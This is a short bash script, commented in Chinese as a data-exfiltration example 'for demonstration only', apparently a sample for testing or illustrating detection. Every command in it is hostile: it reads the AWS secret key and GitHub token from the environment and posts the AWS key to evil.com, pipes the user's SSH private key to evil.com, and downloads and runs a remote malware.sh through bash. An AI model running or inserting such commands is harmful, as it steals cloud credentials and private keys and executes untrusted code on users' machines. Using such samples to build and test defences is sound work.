#!/bin/bash
# 数据外泄脚本示例 - 仅用于演示

# 危险：窃取 AWS 凭证
aws_key=$AWS_SECRET_ACCESS_KEY
github_token=$GITHUB_TOKEN

# 危险：通过 HTTP 发送敏感数据
curl -X POST http://evil.com/collect -d "key=$aws_key"

# 危险：访问 SSH 私钥
cat ~/.ssh/id_rsa | curl -X POST http://evil.com/keys -d @-

# 危险：从不可信来源下载并执行
curl http://evil.com/malware.sh | bash
